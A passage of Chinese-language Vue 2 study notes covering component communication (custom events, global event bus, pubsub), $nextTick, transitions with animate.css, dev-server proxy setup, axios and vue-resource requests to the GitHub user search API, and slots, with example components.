    <button @click="sendStudentName">点击获取学生名字</button><br/>
    <button @click="unbind">解绑atguigu事件</button><br/>
  <button @click="death">销毁当前组件的实例</button>
  </div>
</template>
<script>
export default {
  name: "Students",
  data() {
    return {
      name: "张三",
      sex: "男",
      s: 666,
      number:100
    };
  },

  mounted() {
    console.log("你哈");
  },
  methods: {
    add() {
      console.log('调用了add');
      // console.log(this); vueComponent组件实例对象
      this.number++;
    },
    sendStudentName() {
      //触发students身上的atguigu事件
      this.$emit("atguigu", this.name, 99, 90, 97);
      this.$emit("demo");
    },
    unbind() {
      this.$off('atguigu')//适用于解绑一个自定义事件
      // this.$off(["atguigu", "demo"]); //解绑多个事件
      //this.$off()//解绑所有自定义事件
    },
    death(){
      this.$destroy()//销毁了当前组件的实例，销毁后student中自定义事件也被销毁了
    }
  },
};
</script>
<!-- scoped 作用域的意思 ,lang="css"表示是用css语法写的-->
<style lang="css" scoped>
.demo {
  background-color: rgb(226, 151, 216);
  padding: 5px;
  margin-top: 10px;
}
</style>
```

```vue
//Schools.vue
<template>
  <div class="demo">
    <h3>学校名称：{{ name }}</h3>
    <h3>学校地址：{{ address }}</h3>
  <button @click="sendSchoolName">点击获取学校名字</button>
  </div>
</template>
  <script>
  export default {
    name: 'Schools',
    props: ['getSchoolName'],
      data() {
          return {
              name:'尚硅谷',
              address:'北京'
          }    
    },
    methods: {
        sendSchoolName() {
        this.getSchoolName(this.name)
      }
    }
  }
  </script>
  <style scoped>
    .demo{
      background-color: skyblue;
    padding:5px
    }
  </style
```

```vue
//App.vue
<template>
  <div class="app">
    <h2>{{ msg }} 学生名字是{{ studentName }}</h2>
    <!-- 为Students组件的实例对象vc身上绑定事件 -->
    <!-- 通过父组件给子组件绑定一个自定义事件实现：子给父传递数据 (第一种写法 @或者v-on)-->
    <!-- <Students v-on:atguigu="getStudentName" @demo="m1" /> -->
    <hr />
    <!-- 通过父组件给子组件传递函数类型的props实现：子组件给父组件传递数据 -->
    <Schools :getSchoolName="getSchoolName" />
    <!-- 通过父组件给子组件绑定一个自定义事件实现：子给父传递数据 (第二种写法refs)-->
    <!-- 第二种写法可以设置在多久之后触发事件stguigu ，而第一种不行 -->
    <Students ref="student" @click.native="show"/>
  </div>
</template>
<script>
import Students from "./components/Students.vue";
import Schools from "./components/Schools.vue";
export default {
  name: "App",
  components: {
    Students,
    Schools,
  },
  data() {
    return {
      msg: "你好啊",
      studentName: "",
    };
  },
  methods: {
    getSchoolName(name) {
      console.log("App收到了学校名", name);
    },
    getStudentName(name, ...params) {
      console.log("App收到了学生名", name, params);
      this.studentName = name;
    },
    m1() {
      console.log("demo事件被触发了");
    },
    show() {
      console.log('show函数调用了');
    }
  },
  mounted() {
    setTimeout(() => {
      //这个句子的作用等价于在atguigu触发身上绑定getStudentName事件，即v-on:atguigu="getStudentName"
      this.$refs.student.$on("atguigu", this.getStudentName)

      //方法二 在app上显示学生姓名
      // this.$refs.student.$on("atguigu", (name, ...params) => {
      //   {
      //     console.log("App收到了学生名", name, params);
      //     this.studentName = name;//此时的this指向的是app的组件实例对象（因为箭头函数没有this，所以往外层去找），若不采用箭头函数，则this指向的是student实例对象
      //   }
      // });
      // this.$refs.student.$once('atguigu',this.getStudentName)(用一次)
      //console.log(this.$refs.student);//组件实例对象VueComponent
    }, 3000);
  }
};
</script>
<style lang="css">
.app {
  background-color: gray;
  padding: 5px;
}
</style>
```

```js
//main.js
import Vue from 'vue'
import App from './App.vue'
//全局混入
// import {hunhe,hunhe1} from './mixin'
Vue.config.productionTip = false;
// Vue.mixin(hunhe)
// Vue.mixin(hunhe1)
new Vue({
    el: '#app',
    render: h => h(App),
})
```

![image-20230926114656025](D:\typora_photo\image-20230926114656025.png)

### 4.9 全局事件总线（GobalEventBus）

![image-20230926213344559](D:\typora_photo\image-20230926213344559.png)

**x需要具备的条件：所有组件都能看到；能够使用$on,$emit,$off方法**

总结：
1.一种组件间通信的方式，适用于**任意组件间通信**。
2.**安装全局事件总线**:

```js
new Vue({
    beforeCreate(){
    Vue.prototype.$bus = this //安装全局事件总线，$bus就是当前应用的vm},
    ......
})

//设置全局总线方法一
// const Demo = Vue.extend({})
// const d = new Demo()获得demo的组件实例对象d
// Vue.prototype.x=d 将组件实例对象放到vue的原型对象上
```

3.使用事件总线:
    (1)  接收数据:A组件想接收数据，则在A组件中给$bus绑定自定义事件，事件的回调留在A组件自身。

```js
methods(){
    demo(data){......}
}
mounted(){
    this.$bus.$on('xxxx',this.demo)
}
```

​    (2)  提供数据:**this.$bus.$emit('xxxx',数据)**
​    (3)  **最好在beforeDestroy钩子中，用$off去解绑当前组件所用到的事件**。

```vue
//Schools.vue
<template>
  <div class="demo">
    <h3>学校名称：{{ name }}</h3>
    <h3>学校地址：{{ address }}</h3>
  </div>
</template>
  <script>
  export default {
    name: 'Schools',
    props: ['getSchoolName'],
      data() {
          return {
              name:'尚硅谷',
              address:'北京'
          }  
    },
    mounted(){
        this.$bus.$on('hello', (data) => {
        console.log(data);
      })
    },
    beforeDestroy() {
      this.$bus.$off('hello');//解绑，因为当Schools实例对象被销毁时,其$bus仍然存在vue身上
    }
  }
  </script>
  <style scoped>
    .demo{
      background-color: skyblue;
    padding:5px
    }
  </style>
```

```vue
//Students.vue
<template>
  <div class="demo">
    <h3>学生姓名：{{ name }}</h3>
    <h3>学生性别：{{ sex }}</h3>
    <button @click="sendStudentName">将学生姓名传给school组件</button>
  </div>
</template>
<script>
export default {
  name: "Students",
  data() {
    return {
      name: "张三",
      sex: "男",
      s: 666,
      number:100
    };
  },
  methods: {
    sendStudentName() {
      this.$bus.$emit('hello',this.name)
    }
  },
};
</script>
<!-- scoped 作用域的意思 ,lang="css"表示是用css语法写的-->
<style lang="css" scoped>
.demo {
  background-color: rgb(226, 151, 216);
  padding: 5px;
  margin-top: 10px;
}
</style>
```

```vue
//App.vue
<template>
  <div class="app">
    <h2>{{ msg }}</h2>
    <Schools/>
    <Students/>
  </div>
</template>
<script>
import Students from "./components/Students.vue";
import Schools from "./components/Schools.vue";
export default {
  name: "App",
  components: {
    Students,
    Schools,
  },
  data() {
    return {
      msg:'你好啊'
    }
  }
};
</script>
<style lang="css">
.app {
  background-color: gray;
  padding: 5px;
}
</style>
```

```js
//main.js
import Vue from 'vue'
import App from './App.vue'
//全局混入
// import {hunhe,hunhe1} from './mixin'
Vue.config.productionTip = false;
// Vue.mixin(hunhe)
// Vue.mixin(hunhe1)
//设置全局总线方法一
// const Demo = Vue.extend({})
// const d = new Demo()获得demo的组件实例对象d
// Vue.prototype.x=d 将组件实例对象放到vue的原型对象上
new Vue({
    el: '#app',
    render: h => h(App),
beforeCreate() {
    Vue.prototype.$bus=this
}  
})
```

![image-20230926214647030](D:\typora_photo\image-20230926214647030.png)

### 4.10 消息订阅与发布(pubsub)

1.一种组件间通信的方式，适用于**任意组件间通信**。
2.使用步骤:
   （1）安装pubsub:  

```
npm i pubsub-js
```

  （2）引入:   **import  pubsub from 'pubsub-js'**
  （3）接收数据:A组件想接收数据，则在A组件中订阅消息，订阅的回调留在A组件自身。

```js
//方法一
methods(){
demo(data){......}
}
......
mounted(){
this.pid = pubsub.subscribe('xxx',this.demo) //订阅消息
}

//方法二
mounted(){
    this.pid = pubsub.subscribe('xxx',（msgName,data)=>{
        //msgName 消息名  data 发布的数据
        console.log(data)
    }) //订阅消息
}
```

4.提供数据:   pubsub.publish('消息名',数据)
5.最好在beforeDestroy钩子中，用PubSub.unsubscribe(this.pid)去<span style="color:red">取消订阅。</span>

```vue
//Schools.vue
<template>
  <div class="demo">
    <h3>学校名称：{{ name }}</h3>
    <h3>学校地址：{{ address }}</h3>
  </div>
</template>
  <script>
  import pubsub from 'pubsub-js'
  export default {
    name: 'Schools',
    props: ['getSchoolName'],
      data() {
          return {
              name:'尚硅谷',
              address:'北京'
          }  
    },
    mounted() {
      //订阅消息hello为消息名
        // this.pubId=pubsub.subscribe('hello', function (msgName,data) {//有两个参数，第一个是消息名，第二个是数据
        //   console.log('有人发布消息hello了,hello消息回调执行');
        //   console.log(this);//undefined 因为这个是js第三方库，不能保证this
        //   console.log(msgName,data);
        // })
        this.pubId=pubsub.subscribe('hello',  (msgName,data)=> { //用箭头函数可以保证this指向组件实例对象
          console.log('有人发布消息hello了,hello消息回调执行');
          console.log(this//vueComponent实例对象
          console.log(msgName,data);
        })
    beforeDestroy() {
      //取消订阅
      pubsub.unsubscribe( this.pubId)
    },
  }
  </script>
  <style scoped>
    .demo{
      background-color: skyblue;
    padding:5px
    }
  </style>
```

```vue
//Students.vue
<template>
  <div class="demo">
    <h3>学生姓名：{{ name }}</h3>
    <h3>学生性别：{{ sex }}</h3>
    <button @click="sendStudentName">将学生姓名传给school组件</button>
  </div>
</template>
<script>
  import pubsub from 'pubsub-js'
export default {
  name: "Students",
  data() {
    return {
      name: "张三",
      sex: "男",
      s: 666,
      number:100
    };
  },
  methods: {
    sendStudentName() {
      //发布消息
      pubsub.publish('hello',666)
    }
  }
};
</script>
<!-- scoped 作用域的意思 ,lang="css"表示是用css语法写的-->
<style lang="css" scoped>
.demo {
  background-color: rgb(226, 151, 216);
  padding: 5px;
  margin-top: 10px;
}
</style>
```

```vue
//App.vue
<template>
  <div class="app">
    <h2>{{ msg }}</h2>
    <Schools/>
    <Students/>
  </div>
</template>
<script>
import Students from "./components/Students.vue";
import Schools from "./components/Schools.vue";
export default {
  name: "App",
  components: {
    Students,
    Schools,
  },
  data() {
    return {
      msg:'你好啊'
    }
  }
};
</script>
<style lang="css">
.app {
  background-color: gray;
  padding: 5px;
}
</style>
```

```js
//main,js
import Vue from 'vue'
import App from './App.vue'
//全局混入
// import {hunhe,hunhe1} from './mixin'
Vue.config.productionTip = false;
new Vue({
    el: '#app',
    render: h => h(App)
})
```

![image-20230926230640428](D:\typora_photo\image-20230926230640428.png)

### 4.11 $nextTick

**这是一个生命周期钩子**

1.语法：**this.$nextTick(回调函数)**
2.作用：**在下一次DOM更新结束后执行其指定的回调。**
3.什么时候用：当改变数据后，要基于更新后的新DOM进行某些操作时，要在nextTick所指定的回调函数中执行。

**使用nextTick优化Todo-List**

```vue
<template>
  <li>
    <label>
      <!--      这里勾选和取消勾选可以使用change和click作为事件处理-->
      <input
        type="checkbox"
        :checked="todo.done"
        @change="handleCheck(todo.id)"
      />
      <!--v-model数据的双向绑定，checkbox使用v-model来双向绑定其是否被勾选,也可以实现效果但不推荐(因为其实修改了props中的数据)-->
      <!--这里修改了从List修改过来的props,这里的不允许改是浅层次，就是如果props是一个对象则这个修改这个对象的某一个属性vue是放行的-->
      <!-- <input type="checkbox" v-model="todo.done"/>-->
      <span v-show="!todo.isEdit">{{ todo.title }}</span>
      <input
        v-show="todo.isEdit"
        type="text"
        :value="todo.title"
        @blur="handleBlur(todo, $event)"
        ref="inputTitle"
      />
    </label>
    <button class="btn btn-danger" @click="handleDelete(todo.id)">删除</button>
    <button
      class="btn btn-edit"
      @click="handleEdit(todo)"
      v-show="!todo.isEdit"
    >
      编辑
    </button>
  </li>
</template>
<script>
import pubsub from "pubsub-js";
export default {
  name: "MyItem ",
  props: ["todo"],
  methods: {
    //勾选or取消勾选
    handleCheck(id) {
      //通知APP组件将对应的todo对象的done值取反
      // this.checkTodo(id)
      this.$bus.$emit("checkTodo", id);
    },
    //删除
    handleDelete(id) {
      if (confirm("你确定删除吗？")) {
        // this.deleteTodo(id)
        // this.$bus.$emit('deleteTodo',id)
        pubsub.publish("deleteId", id);
      }
    },
    //编辑
    handleEdit(todo) {
      //判断todo身上有没有这个属性
      if (todo.hasOwnProperty("isEdit")) {
        todo.isEdit = true;//vue检测到值改变就更新DOM
      } else {
        this.$set(todo, "isEdit", true); //在某个对象中添加一个响应式属性isEdit
      }
      //让input框自动获取焦点
      // setTimeout(() => {
      // this.$refs.inputTitle.focus()//得等待input框模板重新解析完成才可以获取焦点
      // }, 200);
      //nextTick是等待DOM节点更新完毕后执行的
      this.$nextTick(function () {
        this.$refs.inputTitle.focus()
      })
    },
    //失去焦点回调（真正执行修改逻辑）
    handleBlur(todo, e) {
      todo.isEdit = false;
      if(!e.target.value.trim()) return alert("输入不能为空")
      this.$bus.$emit("updateTodo", todo.id, e.target.value);
    },
  },
};
</script>
<style scoped>
/*item*/
li {
  list-style: none;
  height: 36px;
  line-height: 36px;
  padding: 0 5px;
  border-bottom: 1px solid #ddd;
}
li label {
  float: left;
  cursor: pointer;
}
li label li input {
  vertical-align: middle;
  margin-right: 6px;
  position: relative;
  top: -1px;
}
li button {
  float: right;
  display: none;
  margin-top: 3px;
}
li:before {
  content: initial;
}
li:last-child {
  border-bottom: none;
}
li:hover {
  background: #ddd;
}
li:hover button {
  display: block;
}
</style>
```

![image-20231001103431669](D:\typora_photo\image-20231001103431669.png)

![image-20231001103444171](D:\typora_photo\image-20231001103444171.png)

### 4.12 Vue封装的过渡与动画

第三方动画库：animate.css https://animate.style/
1.**作用**：在插入、更新或移除DOM元素时，在合适的时候给元素添加样式类名。
2.**图示**：

![Transition Diagram](D:\typora_photo\transition.png)

3.**写法**：
（1）准备好样式:

​            元素进入的样式：

​                    1.v-enter：进入的起点
​                    2.v-enter-active：进入过程中
​                    3.v-enter-to：进入的终点
​             元素离开的样式:

​                     1.v-leave:离开的起点
​                     2.v-leave-active:离开过程中
​                     3.v-leave-to:离开的终点

**其中过渡方法是采用设置进入起点，进入终点，离开起点，离开终点来显示动画。**

（2）使用<transition>包裹要过度的元素，并配置name属性:

```vue
 <transition name="hello" appear>
       <h1 v-show="isShow" >你好啊</h1>
 </transition>
```

（3）备注：若有多个元素需要过渡，则需要使用<transition-group> 且每个元素都要指定key值，其中transition-group和transition中指定的name属性在设置css样式时用到，若设置name=hello,在设置进入起点时默认是v-enter,当name指定值后，就是hello-enter。

（4**）要让页面一开始就加载动画，需要在<transition>中添加appear属性**

4.**集成第三方动画**

animate.css

使用方法：

```js
//下载
$ npm install animate.css
//引入
import 'animate.css';
//使用布局  添加入场与出场动画
通过修改transition中的name值为animate__animated animate__bounce
<transition-group 
        name="animate__animated animate__bounce" 
        appear
        enter-active-class="animate__swing"
        leave-active-class="animate__backOutUp"
        >
         <h1 v-show="!isShow"  key="1">你好啊</h1>
         <h1 v-show="isShow" key="2">哈哈哈</h1>
</transition-group> 
其中enter-active-class与 leave-active-class可以自行选择动画，并复制对应动画名在class中
```

示例：通过点击按钮进行隐藏与显示文字，其中动画是页面一加载就要有的。

**方法一：正常动画方法**

```vue
<template>
  <div>
    <button @click="isShow=!isShow">显示/隐藏</button>
    <transition name="hello" appear>
    <!-- <transition name="hello" :appear=true> -->//第二种写法
     <h1 v-show="isShow">你好啊</h1>
    </transition>
  </div>
</template>
<script>
export default {
    name: 'Test',
    data() {
        return {
            isShow:true
        }
    },
}
</script>
<style scoped>
h1{
    background-color: orange;
}
/* 进入过程的动画 */
.hello-enter-active{
    animation: atguigu 0.5s linear;
}
/* 离开过程的动画 */
.hello-leave-active{
    animation: atguigu 0.5s linear reverse;
}
@keyframes atguigu{
    from{
        transform: translateX(-100%);
    }
    to{
        transform: translateX(0px);
    }
}
 /* 通过在h1上添加class可以实现*/
/* .come{
    animation: atguigu 1s;
}
.go{
    animation: atguigu 1s reverse; // reverse表示反转
}
@keyframes atguigu{
    from{
        transform: translateX(-100%);
    }
    to{
        transform: translateX(0px);
    }
} */
</style>
```

**方法二：过渡方式**   

```vue
<template>
  <div>
    <button @click="isShow = !isShow">显示/隐藏</button>
    <!-- 多个元素过渡方法一 -->
    <!-- <transition name="hello" :appear=true> -->
    <!-- <transition-group name="hello" appear>
       <h1 v-show="isShow"  key="1">你好啊</h1>
       <h1 v-show="isShow" key="2">哈哈哈</h1>
      </transition-group> -->

    <!-- 多个元素过渡方法二 两个元素同时显示与隐藏-->
    <!-- <transition name="hello" appear>
      <div v-show="isShow">
        <h1>你好啊</h1>
        <h1>哈哈哈</h1>
      </div>
    </transition> -->
      <transition-group name="hello" appear>   
       <h1 v-show="!isShow"  key="1">你好啊</h1> #一定要有key值
       <h1 v-show="isShow" key="2">哈哈哈</h1>
      </transition-group> 
  </div>
</template>
  <script>
export default {
  name: "Test2",
  data() {
    return {
      isShow: true,
    };
  },
};
</script>  
  <style scoped>
h1 {
  background-color: rgb(63, 174, 103);
  /* transition: 0.5s linear; */
}
/* 进入的起点  离开的终点 */
.hello-enter,
.hello-leave-to {
  transform: translateX(-100%);
}
.hello-enter-active,
.hello-leave-active {
  transition: 0.5s linear;
}
/* 进入的终点  离开的起点 */
.hello-enter-to,
.hello-leave {
  transform: translateX(0);
}
</style>
```

**方法三：引入集成动画库**

```vue
<template>
    <div>
      <button @click="isShow = !isShow">显示/隐藏</button>
        <transition-group 
        name="animate__animated animate__bounce" 
        appear
        enter-active-class="animate__swing"
        leave-active-class="animate__backOutUp"
        >
         <h1 v-show="!isShow"  key="1">你好啊</h1>
         <h1 v-show="isShow" key="2">哈哈哈</h1>
        </transition-group> 
    </div>
  </template>  
    <script>
    import 'animate.css'
  export default {
    name: "Test2",
    data() {
      return {
        isShow: true,
      };
    },
  };
  </script>
    <style scoped>
  h1 {
    background-color: rgb(63, 174, 103);
  }
  </style>
```

![image-20231001144825683](D:\typora_photo\image-20231001144825683.png)

### 4.13 **Vue脚手架配置代理**

#### 方法一

在vue.config.js中添加如下配置:

```js
devServer:{
      proxy:"http://localhost:5000"
}
```

说明:
1.优点：配置简单，请求资源时直接发给前端(8080)即可。
2.缺点：**不能配置多个代理**，不能灵活的控制请求是否走代理。
3.工作方式：若按照上述配置代理，当请求了前端不存在的资源时，那么该请求会转发给服务器(优先匹配前端资源即是根目录下的文件public)

![image-20231002104209569](D:\typora_photo\image-20231002104209569.png)

#### **方法二**


编写vue.config.js配置具体代理规则:

```js
module.exports = {
    devServer: { 
        proxy: {
            '/api1':{//匹配所有以"/api1'开头的请求路径
                target: 'http://localhost:5000'，//代理目标的基础路径 changeOrigin: true,
                pathRewrite: {'^/api1': ''}//能够将服务器中的特定前缀字段去除，以便服务器访问到
        },
            '/api2':{//匹配所有以"/api2'开头的请求路径
                target: 'http://localhost:5001'，//代理目标的基础路径 changeOrigin: true,
                pathRewrite: {'^/api2':''}
    }
}

//changeOrigin设置为true时，服务器收到的请求头中的host为:localhost:5000 
//changeOrigin设置为false时，服务器收到的请求头中的host为，localhost:8080 
//changeOrigin默认值为true
```

说明:
1.优点：可以配置多个代理，且可以灵活的控制请求是否走代理。
2.缺点：配置略微繁琐，请求资源时必须加前缀。

![image-20231002102736986](D:\typora_photo\image-20231002102736986.png)

```vue
//App.vue
<template>
  <div>
    <button @click="getStudents">获取学生信息</button>
  </div>
</template>
<script>
import axios from 'axios'
export default {
    name: "App",
    methods:{
        getStudents() {
            axios.get('http://localhost:8080/atguigu/student').then(
                response => {
                console.log('请求成功了',response.data);
                },
                error => {
                console.log('请求失败了',error.message);
            }
        )
    }
}
}
</script>
```

```js
//main.js
import Vue from 'vue'
import App from './App.vue'
Vue.config.productionTip = false;
new Vue({
    el: '#app',
    render: h => h(App)
})
```

```js
//index.js 服务器端获取资源路径是http://localhost:5000/student
const express = require("express");
const app = express();
app.get("/student", (req, res) => {
    res.send([{
        id: "101",
        stu: 'ku'
    },
    {
        id: "102",
        stu: 'kui'
    },
    {
        id: "103",
        stu: 'kue'
    },
    ])
})
app.listen(5000, () => {
    console.log("server start");
})
```

![image-20231002103405190](D:\typora_photo\image-20231002103405190.png)4.14 github



### 4.14 github用户搜索案例

请求网址：https://api.github.com/search/users?q=xxx

api中请求到的数据字段，其中items中存放真正数据

![image-20231002114529114](D:\typora_photo\image-20231002114529114.png)

每一个用户具体的信息：

![image-20231002114928212](D:\typora_photo\image-20231002114928212.png)

```vue
//List.vue
<template>
   <div class="row">
    <!--展示用户列表-->
    <div  v-show="info.users.length"  class="card" v-for="user in info.users" :key="user.login">
      <a :href="user.html_url" target="_blank">
        <img :src="user.avatar_url" style='width: 100px'/>
      </a>
      <p class="card-text">{{user.login}}</p>
    </div>
    <!---欢迎词-->
    <h1 v-show="info.isFirst">Welcome!</h1>
    <!--加载中--->
    <h1 v-show="info.isLoading">Loading...</h1>
    <!---错误信息-->
    <h1 v-show="info.errMsg">{{info.errMsg}}</h1>
  </div>
</template>
<script>
export default {
    name: 'List',
    data() {
      return {
        info: {
          isFirst: true,
          isLoading: false,
          errMsg: '',
          users: []
        }
        }
    },
    mounted() {
        this.$bus.$on('updateListData', (dataObj) => {
            console.log('我是list组件，收到了数据：', dataObj);
          this.info ={...this.info,...dataObj}//字面量
        })
    }
}
</script>
<style scoped>
.album {
  min-height: 50rem; /* Can be removed; just added for demo purposes */
  padding-top: 3rem;
  padding-bottom: 3rem;
  background-color: #f7f7f7;
}
.card {
  float: left;
  width: 33.333%;
  padding: .75rem;
  margin-bottom: 2rem;
  border: 1px solid #efefef;
  text-align: center;
}
.card > img {
  margin-bottom: .75rem;
  border-radius: 100px;
}
.card-text {
  font-size: 85%;
}
</style>
```

```vue
//Searchname.vue
<template>
  <section class="jumbotron">
    <h3 class="jumbotron-heading">Search Github Users</h3>
    <div>
      <input
        type="text"
        placeholder="enter the name you search"
        v-model="keyword"
      />&nbsp;
      <button @click="searchUsers">Search</button>
    </div>
  </section>
</template>
<script>
import axios from "axios";
export default {
  name: "Searchname",
  data() {
    return {
      keyword: "",
    };
  },
  methods: {
    searchUsers() {
      //请求前更新List数据
      this.$bus.$emit("updateListData", {
        isFirst: false,
        isLoading: true,
        errMsg: "",
        users: [],
      });
      axios.get(`https://api.github.com/search/users?q=${this.keyword}`).then(
        (response) => {
          console.log("请求成功了", response.data);
          // this.$bus.$emit('getUsers',response.data.items)
          //请求成功后更新List数据
          this.$bus.$emit("updateListData", {
            isLoading: false,
            errMsg: "",
            users: response.data.items,
          });
        },
        (error) => {
          console.log("请求失败了", error.message);
          // 请求失败后更新List数据
          this.$bus.$emit("updateListData", {
            isLoading: false,
            errMsg: error.message,
            users: []
          });
        }
      );
    },
  }
};
</script>
```

```vue
//App.vue
<template>
    <div class="container">
      <Searchname/>
      <List/>
    </div>
  </template>
  <script>
import List from './components/List.vue'
import Searchname from './components/Searchname.vue'
  export default {
      name: "App",
      components: {
        List,Searchname
      }
  }
  </script>
```

```js
//main.js
import Vue from 'vue'
import App from './App.vue'
//全局混入
// import {hunhe,hunhe1} from './mixin'
Vue.config.productionTip = false;
new Vue({
    el: '#app',
    render: h => h(App),
    beforeCreate() {
        Vue.prototype.$bus=this
    },
})
```

![image-20231002144445739](D:\typora_photo\image-20231002144445739.png)



### 4.15 vue 项目中常用的两个ajax库

1. axios :通用的Ajax请求库，官方推荐，**效率高**
2. vue-resource:vue插件库，vue 1.x使用广泛，**官方已不维护**
3. 下载vue-resource库：npm i vue-resource
4. 引入插件： import   vueResource  from   'vue-resource'
5. 使用插件：Vue.use(vueResource)
6. vue-resource的使用在vc身上新增的$http方法

```js
//main.js
import Vue from 'vue'
import App from './App.vue'
//引入插件
import vueResource from 'vue-resource'
//全局混入
// import {hunhe,hunhe1} from './mixin'
Vue.config.productionTip = false;
//使用插件
Vue.use(vueResource)
new Vue({
    el: '#app',
    render: h => h(App),
    beforeCreate() {
        Vue.prototype.$bus=this
    },
})
```

```vue
//Searchname.vue
<template>
  <section class="jumbotron">
    <h3 class="jumbotron-heading">Search Github Users</h3>
    <div>
      <input
        type="text"
        placeholder="enter the name you search"
        v-model="keyword"
      />&nbsp;
      <button @click="searchUsers">Search</button>
    </div>
  </section>
</template>
<script>
export default {
  name: "Searchname",
  data() {
    return {
      keyword: "",
    };
  },
  methods: {
    searchUsers() { 
      // 请求前更新List数据
      this.$bus.$emit("updateListData", {
        isFirst: false,
        isLoading: true,
        errMsg: "",
        users: [],
      });
        //主要区别
      this.$http.get(`https://api.github.com/search/users?q=${this.keyword}`).then(
        (response) => {
          console.log("请求成功了", response.data);
          // this.$bus.$emit('getUsers',response.data.items)
          //请求成功后更新List数据
          this.$bus.$emit("updateListData", {
            isLoading: false,
            errMsg: "",
            users: response.data.items,
          });
        },
        (error) => {
          console.log("请求失败了", error.message);
          // 请求失败后更新List数据
          this.$bus.$emit("updateListData", {
            isLoading: false,
            errMsg: error.message,
            users: []
          });
        }
      );
    },
  },
};
</script>
```

![image-20231002150132793](D:\typora_photo\image-20231002150132793.png)

![image-20231002151214679](D:\typora_photo\image-20231002151214679.png)

### 4.16 插槽

1.作用：**让父组件可以向子组件指定位置插入html结构**，也是一种组件间通信的方式，**适用于父组件 ===> 子组件**。
2.分类：默认插槽、具名插槽、作用域插槽
3.使用方式:

#### （1）默认插槽

```vue
父组件中:
<Category>
   <div>html结构1</div>
</Category>
子组件中:
<template>
   <div>
   <1--定义插槽 -->
   <slot>插槽默认内容...</slot>
   </div>
</template>
```

```vue
//Category.vue
<template>
  <div class="category">
    <h3>{{title}}分类</h3>
 
    <!-- 定义一个插槽 -->
    <slot>我是一些默认值，当使用者没有传递具体数据时，我就会出现</slot>
  </div>
</template>
<script>
export default {
    name: 'Category',
    props:['title']
}
</script>
<style scoped>
.category{
    background-color: skyblue;
    width: 200px;
    height: 300px;  
}
h3{
    text-align: center;
    background-color: orange;
}
</style>
```

```vue
//App.vue
<template>
  <div class="container">
    <Category title="美食">
      <img src="../public/05.jpg" alt="" />
    </Category>
    <Category title="游戏">
      <ul>
        <li v-for="(item, index) in games" :key="index">{{ item }}</li>
      </ul>
    </Category>
    <Category title="电影"> 
      <video src="../public/列表排序.mp4" controls></video>  
    </Category>
  </div>
</template>
  <script>
import Category from "./components/Category.vue";
export default {
  name: "App",
  components: {
    Category,
  },
  data() {
    return {
      foods: ["火锅", "烧烤", "小龙虾", "牛排"],
      games: ["红色警戒", "穿越火线", "劲舞团", "超级玛丽"],
      films: [
        "《红海行动》",
        "《傲慢与偏见》",
        "《超能一家人》",
        "《夏洛特烦恼》",
      ],
    };
  },
};
</script>
  <style>
.container {
  display: flex;
  justify-content: space-around;
}
video{
  width: 100%;
}
</style>
```

```js
//main.js
import Vue from 'vue'
import App from './App.vue'
//全局混入
// import {hunhe,hunhe1} from './mixin'
Vue.config.productionTip = false;
new Vue({
    el: '#app',
    render: h => h(App),
    beforeCreate() {
        Vue.prototype.$bus=this
    },
})
```

![image-20231002155033652](D:\typora_photo\image-20231002155033652.png)

#### （2）具名插槽

具有名字的插槽

```vue
父组件中：
<Category>
    <template slot="center">
       <div>html结构1</div>
    </template>
    <template v-slot:footer>
       <div>htm1结构2</div>
    </template>
</Category>
子组件中:
<template>
    <div>
    <1--定义插槽-->
    <s1ot name="center">插槽默认内容...</slot>
    <slot name="footer">插槽默认内容...</s1ot></div>
</template>
```



```vue
//Category.vue
<template>
  <div class="category">
    <h3>{{title}}分类</h3>
 
    <!-- 定义一个插槽 -->
    <slot name="center">我是一些默认值，当使用者没有传递具体数据时，我就会出现1</slot>
    <slot name="footer">我是一些默认值，当使用者没有传递具体数据时，我就会出现2</slot>
  </div>
</template>
<script>
export default {
    name: 'Category',
    props:['title']
}
</script>
<style scoped>
.category{
    background-color: skyblue;
    width: 200px;
    height: 300px;  
}
h3{
    text-align: center;
    background-color: orange;
}
</style>
```

```vue
//App.vue
<template>
  <div class="container">
    <Category title="美食">
      <img slot="center" src="../public/05.jpg" alt="" />
      <a slot="footer" href="https://www.yuque.com/cessstudy/kak11d/fq1d6m"
        >更多美食</a
      >
    </Category>
    <Category title="游戏">
      <ul slot="center">
        <li v-for="(item, index) in games" :key="index">{{ item }}</li>
      </ul>
      <div slot="footer" class="foot">
        <a href="https://www.yuque.com/cessstudy/kak11d/fq1d6m">网络游戏</a>
        <a href="https://www.yuque.com/cessstudy/kak11d/fq1d6m">单机游戏</a>
      </div>
    </Category>
    <Category title="电影">
      <video slot="center" src="../public/列表排序.mp4" controls></video>
      <!-- <template slot="footer"> -->
        <template v-slot:footer>
        <div class="foot">
          <a href="https://www.yuque.com/cessstudy/kak11d/fq1d6m">经典</a>
          <a href="https://www.yuque.com/cessstudy/kak11d/fq1d6m">热门</a>
          <a href="https://www.yuque.com/cessstudy/kak11d/fq1d6m">推荐</a>
        </div>
        <h4>欢迎来观影</h4>
      </template>
    </Category>
  </div>
</template>
  <script>
import Category from "./components/Category.vue";
export default {
  name: "App",
  components: {
    Category,
  },
  data() {
    return {
      foods: ["火锅", "烧烤", "小龙虾", "牛排"],
      games: ["红色警戒", "穿越火线", "劲舞团", "超级玛丽"],
      films: [
        "《红海行动》",
        "《傲慢与偏见》",
        "《超能一家人》",
        "《夏洛特烦恼》",
      ],
    };
  },
};
</script>
  <style>
.container,
.foot {
  display: flex;
  justify-content: space-around;
}
video {
  width: 100%;
}
h4 {
  text-align: center;
}
</style>
```

```js
//main.js
import Vue from 'vue'
import App from './App.vue'
//全局混入
// import {hunhe,hunhe1} from './mixin'
Vue.config.productionTip = false;
new Vue({
    el: '#app',
    render: h => h(App),
    beforeCreate() {
        Vue.prototype.$bus=this
    },
})
```

![image-20231002161347883](D:\typora_photo\image-20231002161347883.png)

#### （3）作用域插槽

1.理解：数据在组件的自身，但根据数据生成的结构需要组件的使用者来决定。(games数据在Category组件中，但使用数据所遍历出来的结构由App组件决定)  数据本身与需要生成插槽的结构不在同一个组件。
2.具体编码：

```vue
父组件中：	
<Category>
    <template scope="scopeData">
    <!--生成的是u1列表-->
    <ul>
    <li v-for="g in scopeData.games" :key="g">{{g}}</1i>
    </ul>
    </template>
</Category>
<Category>
    <template slot-scope="scopeData">
    <1--生成的是h4标题-->
    <h4 v-for="g in scopeData.games";key="g">{{g}}</h4>{{scopeData.msg}}
    </template>
</Category>

子组件中：
<template>
<div>
    <slot :games="games" msg="hello"></slot>
</div>
</template>

<script>
export default {
    name:'Category', 
    props:['title'],//数据在子组件自身 
    data(){
      return {
